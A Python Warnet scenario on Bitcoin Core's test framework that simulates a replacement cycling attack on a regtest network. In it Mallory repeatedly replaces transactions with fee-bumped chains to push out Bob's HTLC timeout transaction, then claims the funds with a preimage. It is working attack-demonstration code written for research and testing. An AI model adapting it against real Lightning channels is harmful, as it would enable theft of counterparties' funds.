#!/usr/bin/env python3

from decimal import Decimal
from typing import Tuple
from commander import Commander
from dataclasses import dataclass
from typing import List, Optional

# The entire Bitcoin Core test_framework directory is available as a library
from test_framework.key import ECKey, ECPubKey
from test_framework.script import (
        CScript,
        sha256,
        hash160,
        SegwitV0SignatureHash,
        OP_0,
        OP_2,
        OP_CHECKMULTISIG,
        OP_SWAP,
        OP_SIZE,
        OP_EQUAL,
        OP_NOTIF,
        OP_DROP,
        OP_ELSE,
        OP_HASH160,
        OP_EQUALVERIFY,
        OP_CHECKSIG,
        OP_ENDIF,
        OP_TRUE,
        SIGHASH_ALL,
)       

from test_framework.messages import (
        CTransaction,
        CTxIn,
        CTxInWitness,
        CTxOut,
        COutPoint,
        tx_from_hex,
        COIN,
)

from test_framework.test_node import (
    RPCOverloadWrapper,
    TestNode,
)

SATS_PER_VBYTE_MULTIPLIER_1 = 148
SATS_PER_VBYTE_MULTIPLIER_2 = 158

@dataclass
class UTXO:
    txid: str
    vout: int
    address: str
    label: str
    scriptPubKey: str
    amount: Decimal
    confirmations: int
    spendable: bool  # Whether UTXO can be spent
    solvable: bool  # Whether UTXO can be solved
    desc: str  # Output descriptor
    parent_descs: List[str]  # Parent descriptors
    safe: bool  # Whether UTXO is safe to spend

    @classmethod
    def from_dict(cls, d: dict) -> 'UTXO':
        return cls(
            txid=d['txid'],
            vout=d['vout'],
            address=d['address'],
            label=d['label'],
            scriptPubKey=d['scriptPubKey'],
            amount=d['amount'],
            confirmations=d['confirmations'],
            spendable=d['spendable'],
            solvable=d['solvable'],
            desc=d['desc'],
            parent_descs=d['parent_descs'],
            safe=d['safe']
        )

# The actual scenario is a class like a Bitcoin Core functional test.
# Commander is a subclass of BitcoinTestFramework inside Warnet
# that allows us to operate on containerized nodes instead of local nodes.
class ReplacementCycling1(Commander):

    def set_test_params(self):
        """
        Sets the test parameters for the scenario

        Returns: None
        """
        # This setting is ignored but still required as a sub-class of BitcoinTestFramework
        # The number of nodes is specified in the network.yaml file of the deployed network
        # (e.g. 3_node_core)
        self.num_nodes = 3

    def add_options(self, parser):
        """
        Adds command line arguments to the scenario

        Args:
            parser: argparse.ArgumentParser instance

        Returns: None
        """
        parser.description = "Demonstrate Replacement Cycling Attack #1"
        parser.usage = "warnet run /path/to/replacement_cycling_1.py"
        parser.add_argument("--replacement_rounds", type=int, default=2,
                            help="Number of replacement rounds to simulate.")
        parser.add_argument("--base_fee", type=int, default=0,
                            help="Initial fee rate (sat/vbyte) for replacement rounds.")
        parser.add_argument("--fee_increment", type=int, default=20,
                            help="Fee rate increment (sat/vbyte) to apply each replacement round.")

    def get_current_block_height(self, query_node: TestNode) -> int:
        """
        Gets and returns the block height by querying the given node

        Args:
            query_node: TestNode instance

        Returns: int
        """
        block_hash = query_node.getbestblockhash()
        block = query_node.getblock(block_hash)
        block_height = block['height']
        return block_height

    def create_wallet(self, node: TestNode, wallet_name: str) -> RPCOverloadWrapper:
        """
        Creates a wallet on the given node with the given name

        Args:
            node: TestNode instance
            wallet_name: str

        Returns: RPCOverloadWrapper instance
        """
        node.createwallet(wallet_name, descriptors=True)
        wallet_rpc = node.get_wallet_rpc(wallet_name)
        return wallet_rpc

    def fund_wallet(self, funder_wallet: RPCOverloadWrapper, fundee_wallet: RPCOverloadWrapper, amount: int) -> None:
        """
        From the funder_wallet, send the given amount to the fundee_wallet

        Args:
            funder_wallet: RPCOverloadWrapper instance
            fundee_wallet: RPCOverloadWrapper instance
            amount: int

        Returns: None
        """
        funder_wallet.sendtoaddress(fundee_wallet.getnewaddress(), amount)
        return

    @staticmethod
    def create_channel_funding_redeemscript(pubkey1: ECPubKey, pubkey2: ECPubKey) -> CScript:
        """
        Generate a 2-of-2 multisig redeem script from the given pubkeys.

        Args:
            pubkey1: ECPubKey instance
            pubkey2: ECPubKey instance

        Returns: CScript instance (serialised script)
        """
        return CScript([OP_2, pubkey1.get_bytes(), pubkey2.get_bytes(), OP_2, OP_CHECKMULTISIG])
    
    def create_channel_htlc_witness_script(self, funder_pubkey: ECPubKey, fundee_pubkey: ECPubKey, hashlock: bytes) -> CScript:
        """
        Create a HTLC witness script for the channel involving the funder and fundee.

        This HTLC witness script creates a spending condition with two branches:
        - A 2-of-2 multisig path
        - A preimage path

        The data needing to be provided during the spend will either be:
        - A 32-byte pre-image that matches the hashlock, or
        - A 2-of-2 multisig signature from the funder and fundee

        The hashlock is the hash160 of the preimage.

        Note that this script does not include a HTLC expiry, any commitment transaction
        using this script is intended to be broadcast as if the HTLC expiry has already
        passed.

        Script execution:
        <fundee-pubkey>
        OP_SWAP
        OP_SIZE
        32
        OP_EQUAL
        OP_NOTIF // 2-of-2 multisig path
            OP_DROP
            2
            OP_SWAP
            <funder-pubkey>
            2
            OP_CHECKMULTISIG
        OP_ELSE // preimage path
            OP_HASH160
            <hashlock>
            OP_EQUALVERIFY
            OP_CHECKSIG
        OP_ENDIF

        Args:
            funder_pubkey: ECPubKey instance
            fundee_pubkey: ECPubKey instance
            hashlock: bytes

        Returns: CScript instance (serialised script)

        """
        htlc_witness_script = CScript([fundee_pubkey.get_bytes(), OP_SWAP, OP_SIZE, 32,
        OP_EQUAL, OP_NOTIF, OP_DROP, 2, OP_SWAP, funder_pubkey.get_bytes(), 2, OP_CHECKMULTISIG, OP_ELSE,
        OP_HASH160, hashlock, OP_EQUALVERIFY, OP_CHECKSIG, OP_ENDIF])

        return htlc_witness_script

    def create_channel_funding_tx(self, utxo_to_fund: UTXO, pubkey1: ECPubKey, pubkey2: ECPubKey) -> CTransaction:
        """
        Generate a 2-of-2 multisig transaction spending from the given wallet
        and sending the output to a 2-of-2 multisig address with the given pubkeys.

        Args:
            utxo_to_fund: UTXO
            pubkey1: ECPubKey
            pubkey2: ECPubKey

        Returns:
            CTransaction instance
        """
        ms_script = self.create_channel_funding_redeemscript(pubkey1, pubkey2)
        self.log.info(f"Multisig script: {ms_script}")
        ms_script_pubkey = CScript([OP_0, sha256(ms_script)])
        self.log.info(f"Multisig script pubkey: {ms_script_pubkey}")

        self.log.info(f"UTXO to fund: {utxo_to_fund}")
        spend_amount = int((utxo_to_fund.amount * COIN) - (Decimal('0.00001') * COIN))
        self.log.info(f"Spend amount: {spend_amount}")
        tx = CTransaction()
        tx.vin.append(CTxIn(COutPoint(int(utxo_to_fund.txid, 16), utxo_to_fund.vout)))
        tx.vout.append(CTxOut(spend_amount, ms_script_pubkey))
        tx.rehash()

        return tx
    
    def create_replacement_chain_tx(self, signing_wallet: RPCOverloadWrapper, utxo_to_fund: dict, sat_per_vbyte: int) -> Tuple[CTransaction, CTransaction]:
        """
        Generate a parent and child transaction from the given utxo.
        These transactions will be used as the basis for the Replacement Cycling attack.

        Args:
            utxo_to_fund: UTXO dict
            sat_per_vbyte: int (fee in satoshis per vbyte)

        Returns: Tuple[CTransaction, CTransaction]
        """
        parent_tx_fee = sat_per_vbyte * SATS_PER_VBYTE_MULTIPLIER_2
        # Probably the simplest script possible, this is a basic
        # P2WSH output that just requires OP_TRUE to be provided in the witness
        # when spent.
        parent_script = CScript([OP_TRUE])
        parent_script_pubkey = CScript([OP_0, sha256(parent_script)])
        parent_tx = CTransaction()

        parent_tx.vin.append(CTxIn(COutPoint(int(utxo_to_fund['txid'], 16), utxo_to_fund['vout'])))
        parent_tx_amount = int(utxo_to_fund['amount'] * COIN - parent_tx_fee)
        self.log.info(f"Parent tx amount: {parent_tx_amount}")
        self.log.info(f"Parent tx fee: {parent_tx_fee}")
        parent_tx.vout.append(CTxOut(parent_tx_amount, parent_script_pubkey))
        self.log.info(f"Parent tx pre-sign: {parent_tx.serialize().hex()}")
        signed_parent_tx = signing_wallet.signrawtransactionwithwallet(parent_tx.serialize().hex())
        self.log.info(f"Parent tx post-sign: {signed_parent_tx}")
        signed_parent_tx_ct = tx_from_hex(signed_parent_tx['hex'])
        parent_tx_id = signed_parent_tx_ct.rehash()
        self.log.info(f"Parent tx ID: {parent_tx_id}")

        # The fee amount being paid here is parent_fee + child_fee
        child_tx_fee = sat_per_vbyte * SATS_PER_VBYTE_MULTIPLIER_1
        child_tx = CTransaction()
        child_tx.vin.append(CTxIn(COutPoint(int(parent_tx_id, 16), 0), b"", 0))
        child_tx_amount = int(utxo_to_fund['amount'] * COIN - (parent_tx_fee + child_tx_fee))
        self.log.info(f"Child tx amount: {child_tx_amount}")
        self.log.info(f"Child tx fee (includes parent fee): {parent_tx_fee + child_tx_fee}")
        child_tx.vout.append(CTxOut(child_tx_amount, parent_script_pubkey))
        child_tx.wit.vtxinwit.append(CTxInWitness())
        child_tx.wit.vtxinwit[0].scriptWitness.stack = [parent_script]
        child_tx_id = child_tx.rehash()
        self.log.info(f"Child tx pre-sign: {child_tx.serialize().hex()}")
        self.log.info(f"Child tx ID: {child_tx_id}")

        return (signed_parent_tx_ct, child_tx)

    def create_commitment_tx(
            self,
            funding_outpoint: dict,
            htlc_witness_script: CScript,
            funder_seckey: ECKey,
            fundee_seckey: ECKey,
            input_amount: int,
            sat_per_vbyte: int,
            input_script: CScript,
    ) -> Tuple[CTransaction, int]:
        """
        Create a commitment transaction.

        The commitment transaction locks the funds coming from the funding UTXO (the basic 2-of-2 multisig)
        into a HTLC P2WSH output.
        * INPUT TX: the funding UTXO/outpoint
        * OUTPUT TX: a P2WSH output encumbered by the HTLC witness script

        Note that the commitment transaction is intended to be broadcast as if the HTLC expiry has already
        passed, no timelock is included in the commitment transaction.

        Args:
            funding_outpoint: dict - The outpoint of the funding transaction
            htlc_witness_script: CScript - The HTLC witness script
            funder_seckey: ECKey - The private key of the funder
            fundee_seckey: ECKey - The private key of the fundee
            input_amount: int (in satoshis) - The amount locked in the funding outpoint
            sat_per_vbyte: int - The fee rate in satoshis per vbyte
            input_script: CScript - the redeem script for the funding outpoint

        Returns:
            Tuple[CTransaction, int] - The commitment transaction and the fee paid for the commitment transaction
        """
        htlc_witness_program = sha256(htlc_witness_script) # 32-bytes
        # The OP_0 indicates that this is a SegWit v0 output with 32-byte hash -> P2WSH
        htlc_script_pubkey = CScript([OP_0, htlc_witness_program])
        self.log.info(f"HTLC ScriptPubkey: {htlc_script_pubkey}")

        # The commitment transaction has a P2WSH output encumbered by the htlc_witness_script
        commitment_tx_fee = SATS_PER_VBYTE_MULTIPLIER_2 * sat_per_vbyte
        commitment_tx = CTransaction()
        commitment_tx.vin.append(CTxIn(COutPoint(int(funding_outpoint['txid'], 16), funding_outpoint['vout']), b"", 0x1))
        commitment_tx_amount = int(input_amount - commitment_tx_fee)
        self.log.info(f"Commitment tx amount: {commitment_tx_amount}")
        commitment_tx.vout.append(CTxOut(commitment_tx_amount, htlc_script_pubkey))

        self.log.info(f"Input script: {input_script}")
        self.log.info(f"Commitment tx: {commitment_tx}")
        self.log.info(f"Input amount: {input_amount}")
        # Both parties sign the commitment transaction
        commitment_tx_sig_hash = SegwitV0SignatureHash(input_script, commitment_tx, 0, SIGHASH_ALL, int(input_amount))
        self.log.info(f"Commitment tx sig hash: {commitment_tx_sig_hash}")
        funder_sig = funder_seckey.sign_ecdsa(commitment_tx_sig_hash) + b'\x01'
        fundee_sig = fundee_seckey.sign_ecdsa(commitment_tx_sig_hash) + b'\x01'

        commitment_tx.wit.vtxinwit.append(CTxInWitness())
        commitment_tx.wit.vtxinwit[0].scriptWitness.stack = [
            b'',
            funder_sig,
            fundee_sig,
            input_script
        ]
        commitment_tx.rehash()
        self.log.info(f"Commitment tx: {commitment_tx}")

        return commitment_tx, commitment_tx_fee

    def create_timeout_tx(
            self,
            commitment_tx: CTransaction,
            commitment_tx_fee: int,
            htlc_witness_script: CScript,
            funder_seckey: ECKey,
            fundee_seckey: ECKey,
            input_amount: int,
            sat_per_vbyte: int,
            timelock: int,
            nSequence: int,
    ) -> Tuple[CTransaction, int]:
        """
        Create a timeout transaction.

        The timeout transaction is the "refund" transaction - the funds will eventually be claimable through
        the multisig branch of the HTLC after the timelock has expired. The timeout transaction will be used
        by the funder.

        * INPUT TX: the commitment transaction
        * OUTPUT TX: a P2WSH output encumbered by the HTLC witness script

        Args:
            commitment_tx: CTransaction - The commitment transaction
            commitment_tx_fee: int - The fee paid for the commitment transaction
            htlc_witness_script: CScript - The HTLC witness script
            funder_seckey: ECKey - The private key of the funder
            fundee_seckey: ECKey - The private key of the fundee
            input_amount: int (in satoshis) - The amount locked in the commitment transaction
            sat_per_vbyte: int - The fee rate in satoshis per vbyte
            timelock: int - after this many blocks, the timeout transaction can be spent
            nSequence: int - allows RBF & relative timelocks #TODO: is this correct? TX level timelocks are used here
        Returns:
            Tuple[CTransaction, int] - The timeout transaction and the fee paid for the timeout transaction
        """
        # This spend script is really about creating a valid output for the timeout transactions
        # in a way that is trivial to satisfy. In the real-world such a trivial script wouldn't be present,
        # it would be a script representing a spend to a P2WPKH or P2WSH output #TODO: what are some real-world
        # examples of this?
        spend_script = CScript([OP_TRUE])
        spend_scriptpubkey = CScript([OP_0, sha256(spend_script)])

        # The timeout transaction is the "refund" transaction - the funds will eventually be claimable through
        # the multisig branch of the HTLC after the timelock has expired. The timeout transaction will be used
        # by the funder.
        timeout_tx_fee = SATS_PER_VBYTE_MULTIPLIER_2 * sat_per_vbyte
        timeout_tx = CTransaction()
        timeout_tx.vin.append(CTxIn(COutPoint(int(commitment_tx.hash, 16), 0), b"", nSequence))
        timeout_tx_amount = int(input_amount - (2 * commitment_tx_fee + timeout_tx_fee))
        self.log.info(f"Timeout tx amount: {timeout_tx_amount / COIN}")
        timeout_tx.vout.append(CTxOut(timeout_tx_amount, spend_scriptpubkey))
        timeout_tx.nLockTime = timelock

        timeout_tx_sig_hash = SegwitV0SignatureHash(htlc_witness_script, timeout_tx, 0, SIGHASH_ALL, commitment_tx.vout[0].nValue)
        timeout_tx_fundee_sig = fundee_seckey.sign_ecdsa(timeout_tx_sig_hash) + b'\x01'
        timeout_tx_funder_sig = funder_seckey.sign_ecdsa(timeout_tx_sig_hash) + b'\x01'

        # Spend the commitment transaction HTLC output
        timeout_tx.wit.vtxinwit.append(CTxInWitness())
        timeout_tx.wit.vtxinwit[0].scriptWitness.stack = [
            b'',                       # dummy for CHECKMULTISIG bug
            timeout_tx_fundee_sig,
            timeout_tx_funder_sig,
            b'',                       # extra dummy for multisig branch stack requirements
            htlc_witness_script
        ]
        timeout_tx.rehash()
        self.log.info(f"Timeout tx: {timeout_tx}")

        return timeout_tx, timeout_tx_fee

    def create_preimage_tx(
            self,
            commitment_tx: CTransaction,
            commitment_tx_fee: int,
            htlc_witness_script: CScript,
            preimage_parent_tx: CTransaction,
            fundee_seckey: ECKey,
            input_amount: int,
            sat_per_vbyte: int,
            preimage: bytes,
            destination_scriptpubkey: Optional[CScript] = None
    ) -> Tuple[CTransaction, int]:
        """
        Create a preimage transaction.

        The preimage transaction is the "claim" transaction - the funds will claimable through the
        the preimage branch of the HTLC after the preimage is provided. The preimage transaction will be used
        by the fundee.

        Args:
            commitment_tx: CTransaction - The commitment transaction
            commitment_tx_fee: int - The fee paid for the commitment transaction
            preimage_parent_tx: CTransaction - The parent transaction for the preimage transaction
            htlc_witness_script: CScript - The HTLC witness script
            fundee_seckey: ECKey - The private key of the fundee
            input_amount: int (in satoshis) - The amount locked in the commitment transaction
            sat_per_vbyte: int - The fee rate in satoshis per vbyte
            preimage: bytes - the preimage that can be used to unlock the HTLC
            destination_scriptpubkey: Optional[CScript] - The scriptpubkey of the destination of the preimage transaction
        Returns:
            Tuple[CTransaction, int] - The preimage transaction and the fee paid for the preimage transaction
        """

        if not destination_scriptpubkey:
            # This spend script is really about creating a valid output for the preimage transaction
            # in a way that is trivial to satisfy.
            spend_script = CScript([OP_TRUE])
            spend_scriptpubkey = CScript([OP_0, sha256(spend_script)])
        else:
            spend_scriptpubkey = destination_scriptpubkey

        # The preimage transaction is the "claim" transaction - the funds will claimable through the
        # the preimage branch of the HTLC after the preimage is provided. The preimage transaction will be used
        # by the fundee.
        preimage_tx_fee = SATS_PER_VBYTE_MULTIPLIER_1 * sat_per_vbyte
        preimage_tx = CTransaction()
        preimage_tx.vin.append(CTxIn(COutPoint(int(commitment_tx.hash, 16), 0), b"", 0))
        preimage_tx.vin.append(CTxIn(COutPoint(int(preimage_parent_tx.hash, 16), 0), b"", 0))
        preimage_tx_amount = int(2 * input_amount - (commitment_tx_fee + preimage_tx_fee * 3))
        self.log.info(f"Preimage tx amount: {preimage_tx_amount / COIN}")
        preimage_tx.vout.append(CTxOut(preimage_tx_amount, spend_scriptpubkey))

        preimage_tx_sig_hash = SegwitV0SignatureHash(htlc_witness_script, preimage_tx, 0, SIGHASH_ALL, commitment_tx.vout[0].nValue)
        preimage_fundee_sig = fundee_seckey.sign_ecdsa(preimage_tx_sig_hash) + b'\x01'

        # Spend the commitment transaction HTLC output
        preimage_tx.wit.vtxinwit.append(CTxInWitness())
        preimage_tx.wit.vtxinwit[0].scriptWitness.stack = [
            preimage_fundee_sig,
            preimage,
            htlc_witness_script
        ]

        # Spend the parent transaction OP_TRUE output
        parent_tx_script = CScript([OP_TRUE])
        preimage_tx.wit.vtxinwit.append(CTxInWitness())
        preimage_tx.wit.vtxinwit[1].scriptWitness.stack = [parent_tx_script]
        preimage_tx.rehash()
        self.log.info(f"Preimage tx: {preimage_tx}")

        return preimage_tx, preimage_tx_fee

    def run_test(self):
        # ------------------------------------------------------
        # 0 - Setup: network, keys & wallets, funding and mining
        # ------------------------------------------------------
        self.log.info("Waiting for L1 p2p network connections...")
        self.wait_for_tanks_connected()

        self.log.info("Getting peer info")
        for i in range(self.num_nodes):
            peerinfo = self.nodes[i].getpeerinfo()
            self.log.info(f"Node {i} peers:")
            for peer in peerinfo:
                self.log.info(f"\t{peer['addr']} {peer['subver']}")
        
        alice = self.nodes[0]
        mallory = self.nodes[1]
        bob = self.nodes[2]

        def mempool_check():
            self.log.info(f"Alice mempool: {alice.getrawmempool()}")
            self.log.info(f"Mallory mempool: {mallory.getrawmempool()}")
            self.log.info(f"Bob mempool: {bob.getrawmempool()}")

        # --------------------
        # Keys - Mallory & Bob
        # --------------------
        mallory_privkey = ECKey()
        mallory_privkey.generate(True)
        self.log.info(f"Mallory private key: {mallory_privkey}")
        mallory_pubkey = mallory_privkey.get_pubkey()
        self.log.info(f"Mallory public key: {mallory_pubkey}")

        bob_privkey = ECKey()
        bob_privkey.generate(True)
        self.log.info(f"Bob private key: {bob_privkey}")
        bob_pubkey = bob_privkey.get_pubkey()
        self.log.info(f"Bob public key: {bob_pubkey}")

        # -------------------
        # Miner setup - Alice
        # -------------------
        self.log.info("Setting up Alice wallet (& miner)...")
        alice_wallet = self.create_wallet(alice, "alice")

        alice_miner_addr = alice_wallet.getnewaddress()
        self.log.info(f"Alice address for mining rewards: {alice_miner_addr}")

        def gen(n):
            self.log.info(f"Mining {n} blocks...")
            self.generatetoaddress(alice, n, alice_miner_addr, sync_fun=self.no_op)
            self.log.info(f"Mined {n} blocks, new block height: {self.get_current_block_height(alice)}")
            return

        # -----------------------
        # Alice mines some blocks
        # -----------------------
        gen(298)
        self.sync_all()
        self.log.info(f"Alice's balance: {alice_wallet.getbalance()}")

        # ----------------------------------------
        # Setup and fund Mallory and Bob's wallets
        # ----------------------------------------
        self.log.info("Setting up Mallory wallet...")       
        mallory_wallet = self.create_wallet(mallory, "mallory")

        self.log.info("Setting up Bob wallet...")
        bob_wallet = self.create_wallet(bob, "bob")

        self.log.info("Funding Mallory and Bob's wallets...")
        self.fund_wallet(alice_wallet, mallory_wallet, 49.99998)
        self.fund_wallet(alice_wallet, mallory_wallet, 49.99998)
        self.fund_wallet(alice_wallet, bob_wallet, 49.99998)

        def balance_check():
            # self.log.info(f"Alice's balance: {alice_wallet.getbalance()}")
            self.log.info(f"Mallory's balance: {mallory_wallet.getbalance()}")
            self.log.info(f"Bob's balance: {bob_wallet.getbalance()}")

        gen(1) # 299
        self.sync_all()
        balance_check()

        # --------------------------------------------------------------------------
        # 1 - Open channel between Bob and Mallory
        # --------------------------------------------------------------------------
        # Bob funding a "channel" between Bob and Mallory
        self.log.info("Bob funding a \"channel\" between Bob and Mallory...")
        bob_utxos = [UTXO.from_dict(utxo) for utxo in bob_wallet.listunspent()]
        bob_mallory_tx = self.create_channel_funding_tx(bob_utxos[0], bob_pubkey, mallory_pubkey)
        bob_mallory_redeemscript = self.create_channel_funding_redeemscript(bob_pubkey, mallory_pubkey)
        bob_mallory_tx_signed = bob_wallet.signrawtransactionwithwallet(bob_mallory_tx.serialize().hex())
        self.log.info(f"Bob Mallory tx signed: {bob_mallory_tx_signed}")

        self.log.info("Sending Bob Mallory tx...")
        bob_mallory_txid = bob.sendrawtransaction(bob_mallory_tx_signed["hex"])
        bob_mallory_outpoint = {'txid': bob_mallory_txid, 'vout': 0}
        self.log.info(f"Bob Mallory txid: {bob_mallory_txid}")

        balance_check()
        
        # Check the state of each node's mempool
        # We do a sync_all() to ensure that the bob_mallet_tx has been propagated
        # to all nodes (most importantly to Alice who is the miner in this scenario)
        self.sync_all()
        mempool_check()

        # Advance chain, funds are locked in the channel - it's now open
        # Check balances and each node's mempool state
        # There should be no transactions in anyone's mempool
        gen(1) # 300
        mempool_check()
        balance_check()

        # ---------------------------------------------------------------------------------
        # 2 - Construct Mallory's replacement chain & Lightning channel relationship
        #     transactions: commitment tx, timeout tx, preimage tx
        # ---------------------------------------------------------------------------------
        # Use the current block height as the basis for timeout
        commitment_broadcast_block_height = self.get_current_block_height(alice)

        # Generate a preimage for the HTLC
        preimage = b'a' * 32
        hashlock = hash160(preimage)
        self.log.info(f"Preimage: {preimage.hex()}")
        self.log.info(f"Hashlock: {hashlock.hex()}")

        # Mallory creates her replacement chain
        # The parent is used as an input to her preimage transaction
        mallory_utxos = mallory_wallet.listunspent()
        (mallory_replacement_parent_tx, mallory_replacement_child_tx) = self.create_replacement_chain_tx(mallory_wallet, mallory_utxos[0], 1)

        htlc_witness_script = self.create_channel_htlc_witness_script(bob_pubkey, mallory_pubkey, hashlock)
        self.log.info(f"HTLC witness script: {htlc_witness_script}")

        # Create the Lightning channel relationship transactions:
        # - commitment tx
        # - timeout tx
        # - preimage tx
        bob_mallory_commitment_tx, bob_mallory_commitment_tx_fee = self.create_commitment_tx(
            bob_mallory_outpoint,
            htlc_witness_script,
            bob_privkey,
            mallory_privkey,
            int(Decimal('49.99998') * COIN - (Decimal('0.00001') * COIN)),
            2,
            bob_mallory_redeemscript
        )
        self.log.info(f"Bob Mallory's commitment tx fee: {bob_mallory_commitment_tx_fee}")

        bob_timeout_tx, bob_timeout_tx_fee = self.create_timeout_tx(
            bob_mallory_commitment_tx   ,
            bob_mallory_commitment_tx_fee,
            htlc_witness_script,
            bob_privkey,
            mallory_privkey,
            int(Decimal('49.99998') * COIN - (Decimal('0.00001') * COIN)),
            2,
            commitment_broadcast_block_height + 20,
            0x1
        )
        self.log.info(f"Bob's timeout tx fee: {bob_timeout_tx_fee}")

        mallory_preimage_tx, mallory_preimage_tx_fee = self.create_preimage_tx(
            bob_mallory_commitment_tx,
            bob_mallory_commitment_tx_fee,
            htlc_witness_script,
            mallory_replacement_parent_tx,
            mallory_privkey,
            int(Decimal('49.99998') * COIN - (Decimal('0.00001') * COIN)),
            2,
            preimage
        )

        # ---------------------------------------------------------------------------------------------
        # 3 - Broadcast Bob's commitment transaction, advance chain so that timeout tx can be broadcast
        # ---------------------------------------------------------------------------------------------
        bob_mallory_commitment_txid = bob.sendrawtransaction(bob_mallory_commitment_tx.serialize().hex())
        #bob_mallory_commitment_tx_fee = self.get_tx_fee_from_tx(bob, bob_mallory_commitment_tx)
        self.log.info(f"Bob broadcasts his commitment transaction at block height {commitment_broadcast_block_height}")
        self.log.info(f"Bob commitment txid: {bob_mallory_commitment_txid}")

        # Sync all nodes, all nodes should have the above commitment transaction in their mempool
        self.sync_all()
        mempool_check()
        assert bob_mallory_commitment_txid in bob.getrawmempool()
        assert bob_mallory_commitment_txid in mallory.getrawmempool()

        # Advance chain 20 blocks to allow the timeout txs to be broadcast
        gen(20) # 320
        self.sync_all()
        mempool_check()

        # --------------------------------------------------------------------------
        # 4 - Start the replacement cycle
        # --------------------------------------------------------------------------
        # Number of rounds and fee parameters from command-line options.
        replacement_rounds = self.options.replacement_rounds
        base_fee_rate = self.options.base_fee
        fee_increment = self.options.fee_increment

        current_fee_rate = base_fee_rate

        for i in range(replacement_rounds):
            self.log.info(f"----- Replacement Round {i+1} -----")
            # Bob broadcasts his timeout transaction.
            bob_timeout_txid = bob.sendrawtransaction(bob_timeout_tx.serialize().hex())
            self.log.info(f"Round {i+1}: Bob broadcasts his timeout TX with txid: {bob_timeout_txid}")

            # Mallory reacts with her replacement chain, increasing the fee to outcompete Bob
            current_fee_rate += fee_increment
            self.log.info(f"Round {i+1}: Mallory's fee rate: {current_fee_rate}")
            (mallory_replacement_parent_tx, mallory_replacement_child_tx) = self.create_replacement_chain_tx(
                mallory_wallet,
                mallory_utxos[0],
                current_fee_rate
            )
            replacement_parent_txid = mallory.sendrawtransaction(mallory_replacement_parent_tx.serialize().hex())
            replacement_child_txid = mallory.sendrawtransaction(mallory_replacement_child_tx.serialize().hex())
            self.log.info(f"Round {i+1}: Mallory broadcasts replacement chain:"
                        f" parent txid: {replacement_parent_txid}, child txid: {replacement_child_txid}")

            # Generate a new timeout transaction with an updated sequence number and increased fee rate
            # each round to compete with Mallory's replacement chain.
            new_sequence = 0x1 + (i + 1)
            bob_timeout_tx, bob_timeout_tx_fee = self.create_timeout_tx(
                bob_mallory_commitment_tx,
                bob_mallory_commitment_tx_fee,
                htlc_witness_script,
                bob_privkey,
                mallory_privkey,
                int(Decimal('49.99998') * COIN - (Decimal('0.00001') * COIN)),
                current_fee_rate,
                commitment_broadcast_block_height + 20,
                new_sequence
            )
            self.log.info(f"Bob's timeout tx: {bob_timeout_tx}")
            self.log.info(f"Bob's timeout tx fee: {bob_timeout_tx_fee}")
            self.sync_all()
            mempool_check()

        # --------------------------------------------------------------------------
        # 5 - Broadcast Mallory's pre-image transaction
        # --------------------------------------------------------------------------
        # After the replacement rounds, Mallory then broadcasts her final HTLC preimage TX
        # (using the final fee rate) to claim the funds.
        # Create a destination for the final Mallory preimage transaction, so the funds return to Mallory's wallet.
        mallory_preimage_addr = mallory_wallet.getnewaddress()
        self.log.info(f"Mallory preimage return address: {mallory_preimage_addr}")
        # Retrieve address info and convert the scriptPubKey
        addr_info = mallory_wallet.getaddressinfo(mallory_preimage_addr)
        mallory_preimage_scriptpubkey = CScript(bytes.fromhex(addr_info["scriptPubKey"]))
        final_preimage_tx, final_preimage_tx_fee = self.create_preimage_tx(
            bob_mallory_commitment_tx,
            bob_mallory_commitment_tx_fee,
            htlc_witness_script,
            mallory_replacement_parent_tx,
            mallory_privkey,
            int(Decimal('49.99998') * COIN - (Decimal('0.00001') * COIN)),
            current_fee_rate,
            preimage,
            mallory_preimage_scriptpubkey
        )
        self.log.info(f"Final Mallory preimage TX fee: {final_preimage_tx_fee}")

        final_preimage_txid = mallory.sendrawtransaction(final_preimage_tx.serialize().hex())
        self.log.info(f"Final Mallory preimage TX id: {final_preimage_txid}")
        self.sync_all()
        mempool_check()
        # Mine a block to allow the preimage tx to be confirmed
        gen(1) # 321
        self.sync_all()
        mempool_check()
        balance_check()


def main():
    ReplacementCycling1().main()

if __name__ == "__main__":
    main()
